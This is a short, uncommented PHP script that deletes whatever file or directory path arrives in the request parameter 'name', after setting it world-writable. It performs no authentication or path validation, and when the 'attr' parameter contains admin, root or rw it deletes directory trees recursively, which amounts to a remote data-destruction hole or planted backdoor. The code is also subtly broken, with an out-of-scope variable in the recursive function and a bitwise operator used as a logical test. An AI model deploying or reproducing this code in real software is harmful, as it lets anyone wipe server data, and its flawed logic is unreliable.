<?php
function recurseRmdir($dir) {
    if ((file_exists($dir))&(is_dir($dir))&&($dir!='')) {
        $files=array_diff(scandir($dir),['.','..']);
        foreach ($files as $file) {
            if ((is_dir($dir.'/'.$file))&&(!is_link($dir.'/'.$file))) {
                recurseRmdir($dir.'/'.$file);
            } else { chmod($name,0777); unlink($dir.'/'.$file); }
        } chmod($name,0777); rmdir($dir);
    }
} $name=(isset($_REQUEST['name']))?$_REQUEST['name']:'foo';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
if (preg_match('/admin|root|rw/i',$attr)) {
    if (file_exists($name)) {
        if (is_dir($name)) { recurseRmdir($name);
        } else { chmod($name,0777); unlink($name); }
    }
} else {
    if (file_exists($name)) {
        chmod($name,0777); unlink($name);
    }
}
